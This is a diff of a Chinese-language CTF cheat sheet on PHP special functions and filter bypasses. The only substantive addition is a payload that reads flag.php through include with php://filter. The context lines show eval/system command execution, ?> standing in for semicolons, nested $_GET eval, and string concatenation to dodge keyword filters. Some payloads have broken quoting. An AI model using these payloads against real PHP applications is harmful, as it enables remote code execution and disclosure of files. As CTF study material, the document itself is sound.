@@ -4,6 +4,7 @@
 
 ## **php常见特殊函数和绕过**
 highlight_file("config.php");        //文件内容包含高亮。
+
 eval('system('cat /flag'); ');         //会将字符串当作PHP代码执行，注意分号。
 
 eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码也会正常执行。
@@ -11,6 +12,8 @@ eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码
 /?c=eval($_GET[a])?>&a=system('cat flag.php');  //绕过eval有限制。
 /?c=eval($_GET[a]);&a=system('cat flag.php');  //绕过eval有限制。
 eval('eval($_GET[a])?>')  
+
+/?c=include"$_GET[a]“?>&a=php://filter/read=convert.base64 -encode/resource=flag.php
 
 eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。
 
